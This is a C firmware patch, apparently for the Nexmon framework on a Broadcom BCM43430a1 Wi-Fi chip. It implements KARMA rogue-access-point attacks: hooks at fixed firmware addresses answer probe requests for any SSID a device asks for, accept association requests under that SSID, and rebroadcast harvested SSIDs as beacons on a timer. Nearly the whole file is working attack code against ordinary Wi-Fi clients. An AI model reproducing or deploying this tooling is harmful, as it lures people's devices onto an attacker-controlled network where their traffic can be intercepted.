#pragma NEXMON targetregion "patch"

#include <firmware_version.h>
#include <wrapper.h>    // wrapper definitions for functions that already exist in the firmware
#include <structs.h>    // structures that are used by the code in the firmware
#include <patcher.h>
#include <helper.h>
#include "karma.h"
#include "sendframe.h"

#define KARMA_DEBUG			MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_DEBUG)
#define print_dbg(...) 	if(MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_DEBUG)) printf(__VA_ARGS__)
#define print_ndbg(...) 	if(!MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_DEBUG)) printf(__VA_ARGS__)


extern uint32 mame82_opts; //decalred in ioctl.c
extern ssid_list_t* ssids_to_beacon; //declared in autostart.c, as the header is allocated there



/*
void			*g_beacon_template_frame = NULL;
uint8			*g_beacon_template_frame_body = NULL;
int				g_beacon_template_frame_len = 0;
*/

wlc_bsscfg_t	*g_AP_bsscfg = NULL;
beacon_fixed_params_t	*g_beacon_template_head = NULL;
uint8					*g_beacon_template_tail = NULL;
uint					g_beacon_template_tail_len = 0;

struct hndrte_timer 	*g_bcn_tmr = NULL;

void send_beacons(struct wlc_info *wlc, wlc_bsscfg_t *bsscfg, beacon_fixed_params_t *beacon_template_head, uint8 *beacon_template_tail, uint beacon_template_tail_len, ssid_list_t *ssids);


/** Timer based beaconing **/
void bcn_tmr_hndl(struct hndrte_timer *t)
{
	send_beacons(t->data, g_AP_bsscfg, g_beacon_template_head, g_beacon_template_tail, g_beacon_template_tail_len, ssids_to_beacon); 
}

/** end Timer based beaconing **/


//check if an SSID is worth adding to an existing SSID list
int validate_ssid(ssid_list_t *head, char* ssid, uint8 ssid_len)
{
	char *cur_ssid;
	uint8 cur_ssid_len;
	int i, j, match;
	
	if (ssid_len == 0) return 0; // we don't add empty SSIDs to the list
	
	// Went through list
	ssid_list_t *current = head;
	i = -1; //used for loop count and increased at loop entry (to avoid inc in branches), thus -1
    while (current->next != NULL) 
    {	
		i++;
        current = current->next;
		cur_ssid_len = current->len_ssid;
		cur_ssid = current->ssid;
		
		//printf("Checking %s against list pos %d (%s)\n", ssid, i, cur_ssid);
		
		// if length doesn't equal, we check next
		if (cur_ssid_len != ssid_len) continue;
		
		//if length equals, we check char by char
		match = 1;
		for (j = 0; j < MIN(ssid_len, MIN(cur_ssid_len, 32)); j++)
		{
			if (cur_ssid[j] != ssid[j])
			{
				match = 0;
				break; // we don't have to check further
			}
		}
		
		if (match)
		{
			//printf("The SSID %s is already in the list at pos %d\n", ssid, i);
			return 0;
		}
    }
	
	return 1;
}

void push_ssid(ssid_list_t *head, char* ssid, uint8 ssid_len)
{
	//This method doesn't account for duplicates
	
	int i = 0;
	int upper_bound = 40; //hardcoded for now (see performance meassurement comments on send_beacons)
	
    ssid_list_t *current = head;
    while (current->next != NULL) 
    {
        current = current->next;
        i++;
    }
    
    if (i >= upper_bound)
    {
		printf("Not adding SSID %s because list contains max elements %d\n", ssid, i);
		return; //abort appending to list
	}

    current->next = (ssid_list_t*) malloc(sizeof(ssid_list_t), 4);
    if (current->next == NULL)
    {
		printf("Malloc error, not able to add SSID %s to list at pos %d\n", ssid, i);
	}
	else
	{
		printf("Added SSID %s at list pos %d\n", ssid, i);
	}
    current->next->len_ssid = ssid_len;
    memset(current->next->ssid, 0, 32);
    memcpy(current->next->ssid, ssid, ssid_len);
    current->next->next = NULL;
}


void print_mac(struct ether_addr addr)
{
	printf("%x:%x:%x:%x:%x:%x", 
		addr.octet[0],
		addr.octet[1],
		addr.octet[2],
		addr.octet[3],
		addr.octet[4],
		addr.octet[5]
	);
}

void print_mem(void* p, uint32 len)
{
	uint32 i;
	printf("HEXDUMP:\n");
	//for(i = 0; i < len; i++) printf("%d:%02x ", i, ((char*) p)[i]);
	for(i = 0; i < len; i++) printf("%02x ", ((char*) p)[i]);
	printf("\n");
}

void print_bsscfg(wlc_bsscfg_t *bsscfg)
{
	printf("BSSCFG addr %x, points to wlc at %x \n", bsscfg, bsscfg->wlc);
	printf("  up %d, enable %d, _ap %d, _psta %d, associated %d, ssid %s valid AP %d\n", bsscfg->up, bsscfg->enable, bsscfg->_ap, bsscfg->_psta, bsscfg->associated, bsscfg->SSID, BSSCFG_AP_ENABLED(bsscfg));
}

void sscfg_iter_test(struct wlc_info *wlc)
{
	int i;
    wlc_bsscfg_t *bsscfg;
    
    FOREACH_BSS(wlc, i, bsscfg)
    {
		printf("BSSCFG at index[%d] addr %x, points to wlc at %x (real addr %x)\n", i, bsscfg, bsscfg->wlc, wlc);
		printf("  up %d, enable %d, _ap %d, _psta %d, associated %d, ssid %s valid AP %d\n", bsscfg->up, bsscfg->enable, bsscfg->_ap, bsscfg->_psta, bsscfg->associated, bsscfg->SSID, BSSCFG_AP_ENABLED(bsscfg));
    }
}


//Not really a hook, as the legacy method has no implementation (this is why we don't call back to the umodified method)
void wlc_recv_process_prbreq_hook(struct wlc_info *wlc, void *wrxh, uint8 *plcp, struct dot11_management_header *hdr, uint8 *body, int body_len)
{
	/* ToDo:
		- check if used bsscfg is in AP mode before sending probe responses (struct wlc_bsscfg field _ap has to be validated first)
		- don't send responses for PROBES to empty SSID (len == 0) Note: According to the hint from @Singe broadcast probes should be answered for iPhones
		- don't send PROBE RESPONSES for own SSID (this is already done by the PRQ Fifo)
		- optionally send BEACONS for seen PROBE REQUESTS as broadcast (like KARMA LOUD to open new networks to possible STAs)
		- handle Association (incoming SSID has to be exchanged or bsscfg altered once more) - NOte AUTH is working as there's no SSID involved
	*/


	uint8 *SSID_PRQ[32]; //ssid of received probe request
	uint8 *SSID_BSS[32]; //ssid of bsscfg used
	uint8 SSID_PRQ_LEN, SSID_BSS_LEN;

	//uint32 *ui_debug = (uint32*) &(wlc->eventq);

	wlc_bsscfg_t *cfg;
	bcm_tlv_t *ssid;

	int len; //stores beacon template length


	//early out if KARMA probe responding disabled
	if (!MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_PROBE_RESP)) return;

	

	if ((ssid = bcm_parse_tlvs(body, body_len, DOT11_MNG_SSID_ID)) != NULL)
	{
		void *p;
		uint8 *pbody;

//void **pdebug;

		//store recieved SSID
		memset(SSID_PRQ, 0, 32);
		memcpy(SSID_PRQ, ssid->data, ssid->len);
		SSID_PRQ_LEN = (*ssid).len;

		print_dbg("Probe Request received for SSID %s\n", SSID_PRQ);

		//Use current address as BSSID when searching for BSSCFG
		cfg = wlc_bsscfg_find_by_bssid(wlc, &wlc->pub->cur_etheraddr);

		if (cfg == NULL)
		{
			print_dbg("Invalid bsscfg %p, aborting...", cfg);
			return;
		}
//		else print_dbg("Using bsscfg at: %p\n", cfg); //Structs have to be update to fetch index of bsscfg + wlc_if + (bool) _ap
		else printf("Using bsscfg at: %p\n", cfg); //Structs have to be update to fetch index of bsscfg + wlc_if + (bool) _ap






send_beacons(wlc, g_AP_bsscfg, g_beacon_template_head, g_beacon_template_tail, g_beacon_template_tail_len, ssids_to_beacon);			
/*
 * wlc holds a pointer to an bsscfg pointer array (wlc_bsscfg_t    **bsscfg) followed by a pointer to the primary
 * bsscfg (wlc_bsscfg_t    *cfg)
 * 
 * From fw reversing, it seems to be the offset to **bsscfg from the beginning of wlc_info_t is 0x268 (see code at 0x1d250 which should
 * iterate over this list) ... if this is correct, the number of bsscfg is 0x20 (see code at 0x1d282)
 * 
 * To validate these assumptions, we print some test data
 */

/* 
//print_mem(((void*) wlc) + 0x268, 0x84); //looks good 0x26C seems to point to primary bsscfg, thus 0x268 is likely the list pointer
pdebug = ((void*) wlc) + 0x268;
print_mem((void*) *pdebug, 0x84); //deref list pointer and dump data (the primary bsscfg should be part of the array
								//That's a hit, too. The array contains only one bsscfg pointer (in the tests) and is terminated with a 0x00000000 pointer
sscfg_iter_test(wlc);
*/

		//backup original SSID
		memcpy(SSID_BSS, cfg->SSID, 32); //Padding 0x00 bytes are already included
		SSID_BSS_LEN = (*cfg).SSID_len;

		print_dbg("PRQ SSID %s (%d), BSS SSID %s (%d)\n", SSID_PRQ, SSID_PRQ_LEN, SSID_BSS, SSID_BSS_LEN);
		
		len = wlc->pub->bcn_tmpl_len; //should be 512
		print_dbg("bcn_tmpl_len %d\n", len);

		/* build pkt buf with 802.11 MGMT frame HDR, based on current ethernet address (for SA/BSSID) and PRQ SA as DA*/
		//p = wlc_frame_get_mgmt(wlc, FC_PROBE_RESP, &hdr->sa, &bsscfg->cur_etheraddr, &bsscfg->BSSID, len, &pbody)
		p = wlc_frame_get_mgmt(wlc, FC_PROBE_RESP, &hdr->sa, &wlc->pub->cur_etheraddr, &wlc->pub->cur_etheraddr, len, &pbody);



		if (p == NULL)
		{
			printf("PROBE_RESP_GEN: wlc_frame_get_mgmt failed\n");
		}
		else
		{
			/*
			* The frame body (payload with IEs including SSID) is build based on the given bsscfg.
			* This means the resulting PROBERESP wouldn't contain the SSID of the PROBEREQUEST, but
			* the one of the sscfg in use.
			* To overcome this, the're two ways:
			*	1) Generate the PRBRESP with wlc_bcn_prb_body and modify the packet afterwards
			*	(complicated as SSID IE len would likely change)
			*
			*	2) Temp. change the SSID of the current bsscfg to match the PROBE REQUEST
			*	befor calling wlc_bcn_prb_body. (Easy, but dirty ... anyway, preferred solution)
			*/


			//Exchange SSID of bsscfg
			memcpy(cfg->SSID, SSID_PRQ, 32);
			cfg->SSID_len = SSID_PRQ_LEN;

			//generate frame body
			wlc_bcn_prb_body(wlc, FC_PROBE_RESP, cfg, pbody, &len, FALSE);

			//Restore SSID of bsscfg
			memcpy(cfg->SSID, SSID_BSS, 32);
			cfg->SSID_len = SSID_BSS_LEN;

			//set PKT len
			((sk_buff*) p)->len = len + DOT11_MGMT_HDR_LEN;

			print_dbg("PRBRES len %d\nSending Probe Response for %s..\n", ((sk_buff*) p)->len, SSID_PRQ);
//			print_mem(((sk_buff*) p)->data, 60);

			wlc_sendmgmt(wlc, p, wlc->wlcif_list->qi, NULL);
			
			//If beaconing enabled, add to SSID list
			if (MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_BEACONING))
			{
				if (validate_ssid(ssids_to_beacon, (char*) SSID_PRQ, SSID_PRQ_LEN)) push_ssid(ssids_to_beacon, (char*) SSID_PRQ, SSID_PRQ_LEN);
				else printf("SSID '%s' not added to the beaconing list\n");
			}
			

			//print_mem(pbody, 80);
		}

	} //end of if SSID
}

void wlc_recv_mgmt_ctl_hook(struct wlc_info *wlc, void *osh, void *wrxh, void *p)
{
	/*
	* This hook does nothing but printing debug output for MGMT / CONTROL frames
	*/

	struct ether_addr cur_addr = wlc->pub->cur_etheraddr;
	uint8 *plcp;
	struct dot11_management_header *hdr;
	uint16 fc, ft, fk;
	char eabuf[ETHER_ADDR_STR_LEN];

	if (KARMA_DEBUG)
	{
		printf("mame82_opts %x\n", mame82_opts);
		if (MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_PROBE_RESP)) printf("Karma probe responding enabled\n");
		else  printf("Karma probe responding disabled\n");
		if (MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_ASSOC_RESP)) printf("Karma assoc responding enabled\n");
		else  printf("Karma assoc responding disabled\n");
	}
	else
	{
		//early out if DEBUG output is off, as this hook does nothing else right now
		wlc_recv_mgmt_ctl(wlc, osh, wrxh, p);
		return;
	}

	plcp = PKTDATA(osh, p); //fetch packet

	hdr = (struct dot11_management_header*)(plcp + D11_PHY_HDR_LEN); //offset behind D11 header and cast to 802.11 header struct

	fc = ltoh16(hdr->fc); //Account for endianess of frames FC field
	ft = FC_TYPE(fc); //Frame Type (MGMT / CTL / DATA)
	fk = (fc & FC_KIND_MASK); //Frame Kind (ASSOC; PROBEREQUEST etc.)

	//early out on none PROBE frames
	if (fk != FC_PROBE_REQ)
	{
		wlc_recv_mgmt_ctl(wlc, osh, wrxh, p);
		return;
	}


	printf("wl%d ether %x:%x:%x:%x:%x:%x: wlc_recv_mgmt_ctl\n", 
		wlc->pub->unit,
		cur_addr.octet[0],
		cur_addr.octet[1],
		cur_addr.octet[2],
		cur_addr.octet[3],
		cur_addr.octet[4],
		cur_addr.octet[5]
	);


	printf("Frame data\n===================\n\n");
	printf("FC:\t%04x\n", fc);
	printf("Frame Type:\t%04x\n", ft);
	printf("Frame Kind:\t%04x\n", fk);
	printf("  da:\t\t"); print_mac(hdr->da); printf("\n");
	printf("  sa:\t\t"); print_mac(hdr->sa); printf("\n");
	printf("  bssid:\t"); print_mac(hdr->bssid); printf("\n");

	switch(fk)
	{
		case FC_PROBE_REQ:
			printf("Frame is PROBE REQUEST\n");
			bcm_ether_ntoa(&hdr->sa, eabuf); //Test Firmware String conversion of MAC-Address
			printf("SA %s\n", eabuf);
			break;
	}


	// call legacy method
	wlc_recv_mgmt_ctl(wlc, osh, wrxh, p);
}

void wlc_ap_process_assocreq_hook(void *ap, wlc_bsscfg_t *bsscfg, struct dot11_management_header *hdr, uint8 *body, uint body_len, struct scb *scb, bool short_preamble)
{
	int ie_offset = 4;

	bcm_tlv_t *ssid;
	uint8 *SSID_ASC[32]; //ssid of received probe request
	uint8 *SSID_BSS[32]; //ssid of bsscfg used
	uint8 SSID_ASC_LEN, SSID_BSS_LEN;
	
	
	//early out if KARMA association responding disabled
	if (!MAME82_IS_ENABLED_OPTION(mame82_opts, MAME82_KARMA_ASSOC_RESP))
	{
		wlc_ap_process_assocreq(ap, bsscfg, hdr, body, body_len, scb, short_preamble);
		return;
	}

	print_dbg("wlc_ap_process_assocreq_hook called\n---------------------\n");


	if ((ssid = bcm_parse_tlvs(body + ie_offset, body_len - ie_offset, DOT11_MNG_SSID_ID)) != NULL)
	{
		//Copy SSID of ASSOC
		memset(SSID_ASC, 0, 32);
		memcpy(SSID_ASC, ssid->data, ssid->len);
		SSID_ASC_LEN = (*ssid).len;

		//Copy SSID of BSSCFG SSID
		memcpy(SSID_BSS, bsscfg->SSID, 32); 
		SSID_BSS_LEN = (*bsscfg).SSID_len;

		print_dbg("ASSOC REQ for SSID '%s' (%d), AP has SSID '%s' (%d)\n", SSID_ASC, SSID_ASC_LEN, SSID_BSS, SSID_BSS_LEN);

		//Exchange SSID of BSS with the one from ASSOC before handling the frame
		memcpy(bsscfg->SSID, SSID_ASC, 32);
		bsscfg->SSID_len = SSID_ASC_LEN;

		//generate frame 
		wlc_ap_process_assocreq(ap, bsscfg, hdr, body, body_len, scb, short_preamble);

		//Restore SSID of bsscfg
		memcpy(bsscfg->SSID, SSID_BSS, 32);
		bsscfg->SSID_len = SSID_BSS_LEN;
	}
	else
	{
		printf("SSID couldn't be extracted from ASSOC REQ\n");
		print_mem(body, 30);

		//The legacy method is already overwritten by a flaspatch (53)
		wlc_ap_process_assocreq(ap, bsscfg, hdr, body, body_len, scb, short_preamble);
	}

}


void hook_wlc_bss_up_from_wlc_bsscfg_up(wlc_ap_info_t *ap, wlc_bsscfg_t *bsscfg)
{
	struct wlc_info *wlc;

/*	
	struct ether_addr broadcast_mac = { .octet = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF } };
	uint8 ssid_fill[32] = { 
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41
		};	
	uint8 orig_ssid_len = 0;
*/
	
	//For method2
	uint8 *pkt_data = NULL;
	int pkt_len = 0;
	uint16 *template = NULL;
	uint8 skip_ssid_len = 0;
	
	printf("Called hook for 'wlc_bss_up' from 'wlc_bsscfg_up'\n");
	
//	printf("before wlc_bss_up\n");
//	print_bsscfg(bsscfg);
	
	wlc_bss_up(ap, bsscfg);
	
	/*
	 *  Everything beyond this point is meant to allow KARMA beaconing + multiple SSID beaconing
	 *  which couldn't be disable right now.
	 *  - the code creates a template for a beacon frame according to the APs bsscfg (fixed parameters + tagged params like supported rates
	 * 	  only the IE of the SSID isn't stored)
	 *  - a timer is added to beacon every 100ms (loops through list of ssids and dynamically creates sk_buff from the template + ssid entry of the list and sends it)
	 *  - SSIDs for beaconing are stored in the list 'ssids_to_beacon'
	 * 		- autostart.c adds 3 static SSIDs to the list ("tEst0", "tEst1" and "tEst2")
	 * 		- the rest of the list is filled with SSIDs from received probe requests (KARMA LOUD)
	 * 		- the list is limited to 40 entries right now (see send_beacons for details on performance)
	 * 
	 *  Stopping the AP, doesn't remove the timer right now.
	 *  Stop / Restart of AP doesn't free used ressources, right now
	 * 
	 *  There's no thread synchronization on the list 'ssids_to_beacon', which could be a problem
	 * because it is likely that the code adding list entries and the code of the timer (iterates over the list)
	 * don't use the same thread context. The variables in use are global.
	 * 
	 * SSIDs aren't deleted from the list once added. This could be done by some logic, which deletes SSIDs
	 * without associating STAs after a timeout of some seconds.
	 * 
	 * An ioctl to add static SSIDs needs to be added
	 * 
	 * KARMA should be extended to accept connections for different BSSIDs, thus beacons with multiple SA/BSSID
	 * could be generated. It seems up to 0x20 bsscfg could be handled by the firmware, while only a few are in use.
	 */
	
	
	
//	printf("after wlc_bss_up\n");
//	print_bsscfg(bsscfg);

	//assure the BSSCFG is for a AP and UP
	if (!BSSCFG_AP_ENABLED(bsscfg)) return;
	
	//store the cfg globally
	if (g_AP_bsscfg)
	{
		printf("There's already an AP bsscfg, so this is a reconfiguratio / restart of the AP\n");
		
		//ToDo: Free old bsscfg dependent resources 
		// 	- global sk_buffs + template buffers
		//	- check if timer is already initialized and only has to be added again !! The timer has to be deleleted on bss_down !!
	}
	else
	{

		//Create a beacon frame for the BSSCFG
		g_AP_bsscfg = bsscfg;
		wlc = bsscfg->wlc;
		
		
/*		
		g_beacon_template_frame_len = wlc->pub->bcn_tmpl_len;

		//METHOD 1 (generates full sk_buff with BEACON frame payload)
		//void* wlc_frame_get_mgmt(wlc_info_t *wlc, uint16 fc, const struct ether_addr *da, const struct ether_addr *sa, const struct ether_addr *bssid, uint body_len, uint8 **pbody)
		g_beacon_template_frame = wlc_frame_get_mgmt(wlc, FC_BEACON, &broadcast_mac, &wlc->pub->cur_etheraddr, &wlc->pub->cur_etheraddr, g_beacon_template_frame_len, &g_beacon_template_frame_body);
		
		
		//Exchange SSID of bsscfg to a SSID of len 32
		orig_ssid_len = g_AP_bsscfg->SSID_len;
		memcpy(g_AP_bsscfg->SSID + orig_ssid_len, &ssid_fill, 32 - orig_ssid_len);
		g_AP_bsscfg->SSID_len = 32;
		//generate frame body
		wlc_bcn_prb_body(wlc, FC_BEACON, g_AP_bsscfg, g_beacon_template_frame_body, &g_beacon_template_frame_len, FALSE);
		//restore bsscfg SSID
		memset(g_AP_bsscfg->SSID + orig_ssid_len, 0x00, 32 - orig_ssid_len);
		g_AP_bsscfg->SSID_len = orig_ssid_len;

		((sk_buff*) g_beacon_template_frame)->len = g_beacon_template_frame_len + DOT11_MGMT_HDR_LEN; //correct fram len to contain 80211 header + bcn body


		printf("%d pkt 1 len\n", g_beacon_template_frame_len);
		printf("body addr: %x\n", g_beacon_template_frame_body);
		print_mem((void*) g_beacon_template_frame_body, 40);
*/
		
		//METHOD2 (generates normal unit8* buffer, containing raw BEACON payload and PHY + 80211 headers (which are stripped off))
		pkt_len = wlc->pub->bcn_tmpl_len;
		template = (uint16 *) malloc(pkt_len, 2);
		pkt_data = (uint8 *) template;
				
		ratespec_t rspec = wlc_lowest_basic_rspec(wlc, &g_AP_bsscfg->current_bss->rateset);
		wlc_bcn_prb_template(wlc, FC_BEACON, rspec, g_AP_bsscfg, template, &pkt_len);
		pkt_data = (uint8 *) template;
		//Drop PHY header
		pkt_data += D11_PHY_HDR_LEN;
		pkt_len -= D11_PHY_HDR_LEN;
		//Drop 802.11 MGMT HEADER (should end with same buffer like body data of method1, but without having a sk_buff generated)
		pkt_data += DOT11_MGMT_HDR_LEN;
		pkt_len -= DOT11_MGMT_HDR_LEN;
		
		
		
		

		//store head part of beacon payload (up till first IE, which should be the SSID)
		g_beacon_template_head = (void*) pkt_data;
		pkt_data += sizeof(beacon_fixed_params_t);
		pkt_len -= sizeof(beacon_fixed_params_t);
		
		//skip SSID
		if (*pkt_data != 0) //Check type field (0: SSID)
		{
			printf("First IE isn't SSID, aborting ... \n");
			//ToDo: free template buffer
		}
		pkt_data += 1; //Skip type field
		pkt_len -= 1;
		skip_ssid_len = *pkt_data + 1; //The byte for the SSID IE length field is added to skip size
		pkt_data += skip_ssid_len;
		pkt_len -= skip_ssid_len;

		//store tail + remaining length
		g_beacon_template_tail = pkt_data;
		g_beacon_template_tail_len = pkt_len; 
		
		
		print_mem((void*) pkt_data, 20);
		printf("%d pkt 2 len\n", pkt_len);
		
		//TEST (assure we are able to send twice)
//		send_beacons(wlc, g_AP_bsscfg, g_beacon_template_head, g_beacon_template_tail, g_beacon_template_tail_len);
//		send_beacons(wlc, g_AP_bsscfg, g_beacon_template_head, g_beacon_template_tail, g_beacon_template_tail_len);



		/** Prepare beaconing timer **/
		if (!g_bcn_tmr)
		{
			g_bcn_tmr = hndrte_init_timer(0, wlc, bcn_tmr_hndl, 0);
			hndrte_add_timer(g_bcn_tmr, 100, 1);
		}
		
	}
}


void send_beacons(struct wlc_info *wlc, wlc_bsscfg_t *bsscfg, beacon_fixed_params_t *beacon_template_head, uint8 *beacon_template_tail, uint beacon_template_tail_len, ssid_list_t *ssids)
{
	/*
	 * sk_buff has to be recreated per send (seems it gets freed after sending)
	 * 
	 * This could maybe be avoided by using nexmon's sendframe (no queue involved) and reusing the sk_buff
	 * (replace the payload and resend)
	 */
	
	/*
	 * Notes on performance tests:
	 * -	This codes manages to send one beacon about every 2ms (including sk_buff creation and debug out)
	 * -	The time manages to restart the code in less than 100ms, when a station is connected and communicating
	 * - 	SSIDs to beacon for should be hard limited to a count <50 (this should be fine, as the implementytion of this firmware only manages 0x20 bsscfg's
	 * 	this is likely true for others)
	 * - currently every beacon is send with the same BSSID/SA, so depending on the target STA this could look like a fast name change of SSID while the AP
	 * stays the same - on the other hand, this allows association with this BSSID for (independent of the spotted beacon/probe_resp = KARMA)
	 */
    
    bcm_tlv_t *inject_ssid;
    
    
    struct ether_addr broadcast_mac = { .octet = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF } }; // should be globally initialized
    sk_buff* beacon;
    uint8* beacon_body; //points to data part of sk_buff where BEACON body starts
    void *buf_pos; //points to current pos in data part of sk_buff
    
    char *cur_ssid;
	uint8 cur_ssid_len;
	ssid_list_t *current = ssids;
//   int i = 0;
    
    if (!bsscfg) return; //early out (it should be an AP_bsscfg)
    if (!ssids) return; //early out 
    
 
    while (current->next != NULL) 
    {	
        current = current->next;
		cur_ssid_len = current->len_ssid;
		cur_ssid = current->ssid;
		
//		printf("Beaconing for SSID '%s' at idx %d\n", cur_ssid, i);
//		i++;
    
		beacon = wlc_frame_get_mgmt(wlc, FC_BEACON, &broadcast_mac, &wlc->pub->cur_etheraddr, &wlc->pub->cur_etheraddr, wlc->pub->bcn_tmpl_len, &beacon_body);
		
		buf_pos = skb_pull(beacon, DOT11_MGMT_HDR_LEN);
		memcpy(beacon_body, beacon_template_head, sizeof(beacon_fixed_params_t));
		buf_pos += sizeof(beacon_fixed_params_t);
		
		//we should point to IE for SSID now, cast it to a tlv
		inject_ssid = (bcm_tlv_t *) buf_pos;
		inject_ssid->id = 0;
		inject_ssid->len = cur_ssid_len;
		memcpy(&inject_ssid->data, cur_ssid, cur_ssid_len);
		buf_pos += cur_ssid_len + 2;
		
		//append beacon tail
		memcpy(buf_pos, beacon_template_tail, beacon_template_tail_len);
		
		//adjust length (DOT11 mgmt headers not included, as sk_buf->data is pointing at payload, not at 80211 HDR
		beacon->len = sizeof(beacon_fixed_params_t) + cur_ssid_len + 2 + beacon_template_tail_len;

		//adjust sk_buff to include 80211 MGMT Hdrs
		skb_push(beacon, DOT11_MGMT_HDR_LEN);

/*
		//debug out
		printf("Beacon len %d\n", beacon->len);
		print_mem(beacon->data, 60);
*/
		
//		wlc_sendmgmt(wlc, beacon, wlc->wlcif_list->qi, NULL); //sends the packet but crashes after too many sk_buff allocs (doesn't free ??)
		sendframe(wlc, beacon, 1, 0); //sends the packets without crashing for new sk_buff allocs by wlc_frame_get_mgmt
		
		
//		PKTFREE(wlc->osh, beacon, 1); //free sk_buff of beacon, but send it first
	}
	
}


__attribute__((at(0x0084822a, "flashpatch", CHIP_VER_BCM43430a1, FW_VER_7_45_41_46)))
BLPatch(hook_wlc_bss_up_from_wlc_bsscfg_up, hook_wlc_bss_up_from_wlc_bsscfg_up);


__attribute__((at(0x012da2, "", CHIP_VER_BCM43430a1, FW_VER_7_45_41_46)))
BPatch(wlc_recv_mgmt_ctl_hook, wlc_recv_mgmt_ctl_hook);


__attribute__((at(0x00820b9a, "flashpatch", CHIP_VER_BCM43430a1, FW_VER_7_45_41_46)))
BLPatch(wlc_recv_process_prbreq_hook, wlc_recv_process_prbreq_hook);


//hook the call to wlc_ap_process_assocreq in wlc_recv_mgmt_ctl (0x00820f2e   bl wlc_ap_process_assocreq)
__attribute__((at(0x00820f2e, "flashpatch", CHIP_VER_BCM43430a1, FW_VER_7_45_41_46)))
BLPatch(wlc_ap_process_assocreq_hook, wlc_ap_process_assocreq_hook);




